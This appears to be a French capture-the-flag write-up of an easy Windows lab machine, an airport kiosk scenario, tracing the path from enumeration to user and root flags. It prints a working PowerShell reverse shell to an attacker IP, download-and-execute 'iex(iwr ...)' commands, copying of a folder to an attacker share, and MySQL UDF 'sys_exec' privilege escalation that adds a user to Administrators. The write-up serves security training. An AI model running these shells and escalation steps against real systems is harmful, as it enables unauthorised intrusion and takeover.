Easy, Windows
Login donné : Jenny Crawford / KS7X2M
- - -
# User flag
```bash
$ nmap 10.129.72.233 -sC -sV

PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
3389/tcp open  ms-wbt-server Microsoft Terminal Service
5985/tcp open  wsman         # WinRM Possible
8443/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-title: Nexion DeviceHub - Login
|_Requested resource was /login
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-cors: GET POST PUT OPTIONS
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
On a un service MSRPC en 135, un service RDP en 3389, un service WinRM en 5985, et la page de connexion suivante en 8443 :
![[Pasted image 20261005085647.png]]

Dans le code source de la page, à côté de *Forgot your password?*, il y a l'indice suivant : **The default password is the device serial number included in your DeviceHub packaging.**
Il n'y a pas d'autres informations, on lance alors un `dirb` sur le site :

```bash
$ dirb http://10.129.72.233:8443 -X .php,,.html 

+ http://10.129.72.233:8443/api (CODE:403|SIZE:35)
+ http://10.129.72.233:8443/favicon.ico (CODE:200|SIZE:452)
+ http://10.129.72.233:8443/login (CODE:200|SIZE:3572)

# /api est forbidden, mais peut-être pas ses branches
$ dirb http://10.129.72.233:8443/api -X .php,,.html
+ http://10.129.72.233:8443/api/scan (CODE:405|SIZE:30)
+ http://10.129.72.233:8443/api/status (CODE:200|SIZE:116)
```
En allant sur la page autorisée `/api/status`, on y trouve ce JSON
```json
{
	"device":"Nexion DeviceHub DH-100",
	"serial":"NX-DH-2024-B7042",
	"firmware":"1.4.2",
	"status":"online",
	"uptime":61029
}
```
qui contient le numéro de série de l'appareil, ie le mot de passe par défaut.
On arrive alors sur cette page :
![[Pasted image 20261006120054.png]]
Il y a des creds (affichées sous `••••••••`) :
```
KioskUser:K!0sk2026#
```
On peut upload une image dans `/scanner` ; il y a une vérification du type de fichier, et passer par `.sh.png` ne fonctionne pas.

On va utiliser les creds pour se connecter aux autres sessions.
```bash
$ evil-winrm -i 10.129.72.233 -u 'KioskUser' -p 'K!0sk2026#'
# Connexion OK, mais commandes limitées

$ xfreerdp /u:'KioskUser' /p:'K!0sk2026#' /v:10.129.72.233 /port:3389
# Connexion OK
```

Sur le service RDP, il semble que l'on accède à un ordinateur de l'aéroport, où l'on rentre les informations de vol. Les creds `Jenny Crawford:KS7X2M` nous sont utiles ici.
![[Pasted image 20261006181510.png]]
La seule autre piste que l'on aurait est de passer par le *Staff login*, où il faut scanner un badge.
![[Pasted image 20261006181849.png]]
Le scanner pour les passeports semble être le même pour le badge. Il y a probablement un concours de circonstances à réussir entre ce scan de badge sur RDP et sur le site au port 8443.
On voit dans les logs que quand on veut scan le badge admin, il y a un document de détecté uniquement quand on a upload une image au préalable dans `/scanner`.
Sans document, on a *No badge detected on scanner*.
Avec un document n'importe lequel, on *Could not read badge barcode*.
Avec une image de code barre au hasard, on a le même message.

Peut-être que l'on peut récupérer des informations sur un potentiel badge dans le printer ? Je vide la réserve de papier dans un premier temps. Y a plus de papier mais ça imprime quand même. Et on a rien de plus.

L'image uploadée dans le scanner nous est retournée. Y aurait-il un fichier staff-badge.png ?
On refait une recherche réseau plus poussée :
```bash
feroxbuster -u http://10.129.72.233:8443 -w /usr/share/wordlists/dirb/common.txt -x xml,json,html -m GET,POST -s 200,204,301,302,307,401,403 --force-recursion -d 4 -t 50 -k
```
Rien..

On utilise maintenant un outil pour piéger un `.png` et l'envoyer au serveur, de manière à avoir un remote shell.
```bash
rmetashell "netcat 10.0.2.15 4444" HTB/Touch/barcode.png http://10.129.72.233:8443/api/scanner/test-image
```

Retour en arrière un petit peu. Nous avons l'accès au scanner. On l'éteint. Quand on scanne le badge admin, on obtient une erreur, qui nous emmène vers une page web sur Edge (pas de connexion). A partir de là, on peut aller dans les téléchargements, donc dans le dossier téléchargement. Enfin, on peut ouvrir un PowerShell avec `SHIFT + Clic droit`.
Dans `~\Desktop\user.txt`, on trouve alors le User flag !

Pour avoir un meilleur espace de travail qu'un RDP qui bugue, on va faire un reverse shell :
```bash
# Linux
cat > shell.ps1 <<'EOF'
$c=New-Object System.Net.Sockets.TCPClient('10.10.14.158',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sby=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()}
EOF

python3 -m http.server 80
nc -lvnp 4444
```

```powershell
# Windows (PowerShell)
iex(iwr http://10.10.14.158/shell.ps1 -UseBasicParsing)
```
# Root flag
On lance l'énumération WinPEAS (équivalent Windows de LinPEAS). Elle n'a rien donné.
```powershell
iex(iwr http://10.10.14.158/winpeas.ps1 -UseBasicParsing)
```

```powershell
Copy-Item -Recurse C:\MySQL \\10.10.14.158\share\
```


Dans le dossier ProgramData :
```powershell
PS C:\ProgramData\HTB Airways> cat refresh-dates.bat
@echo off
C:\MySQL\bin\mysql.exe -u root -pHTB@irw4ys_DB!2026 < "C:\ProgramData\HTB Airways\refresh-dates.sql" 2>nul
```

On se connecte alors sur MySQL :
```powershell
PS C:\ProgramData\HTB Airways> C:\MySQL\bin\mysql.exe -u root -pHTB@irw4ys_DB!2026
```
Et après avoir installé la commande `sys_exec` de MySQL (cf. MetaSploit framework `/exploit/mysql`), on peut alors :
```mysql
# Création de la fonction sys_exec
create function sys_exec returns int soname 'lib_mysqludf_sys_64.so';

# Utilisation de sys_exec pour donner droits admin à KioskUser
select sys_exec('cmd.exe /c net localgroup Administrator KioskUser /add > C:/ProgramData/addadmin.txt 2>&1');
```

Ensuite on se déconnecte, et on obtient enfin l'accès `Administrator` en se reconnant via `xfreerdp`.
On peut alors récupérer le flag sur `/Administrator/Desktop/root.txt`, et on le récupère via un serveur Python personnalisé.

![[Pasted image 20261008161307.png]]
![[Pasted image 20261008161254.png]]

